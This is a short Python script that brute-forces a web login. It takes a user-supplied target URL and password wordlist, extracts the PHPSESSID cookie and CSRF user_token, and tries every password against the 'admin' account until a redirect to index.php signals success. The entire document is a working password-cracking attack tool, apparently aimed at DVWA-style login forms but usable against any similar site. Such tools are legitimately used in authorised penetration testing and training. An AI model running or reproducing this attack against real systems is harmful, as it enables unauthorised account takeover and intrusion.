#!/usr/bin/env python3
# Crack Web Login using wordlists
# Author Yehia Elghaly

import requests
from bs4 import BeautifulSoup
import re
import colorama 
from colorama import Fore, Back, Style

url = input("Enter Target URL: ")
users = "admin"
password_list = input("Enter Password List: ")
pf = open(password_list, "r")
passwords = pf.readlines()
pf.close()
done = False
print("Cracking " + url + "\n")

try:
    r = requests.get(url, timeout=10)
except ConnectionRefusedError:
    print("Server Unavailable - Exit")

session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
session_id = session_id.group(1)
print("Session-id: " + session_id)
cookie = {"PHPSESSID": session_id}
soup = BeautifulSoup(r.text, "html.parser")
user_token = soup.find("input", {"name":"user_token"})["value"]
print("User_Token: " + user_token + "\n")

for password in passwords:
        if not done:
            password = password.rstrip()
            payload = {"username": users,
                "password": password,
                "Login": "Login",
                "user_token": user_token}

            reply = requests.post(url, payload, cookies=cookie, allow_redirects=False)

            result = reply.headers["Location"]
            print("Trying: " + users + ", " + password)

            if "index.php" in result:
                print(Fore.GREEN + "Attacking Results! \nUser: " + users + " \nPassword: " + password)
                done = True
        else:
            break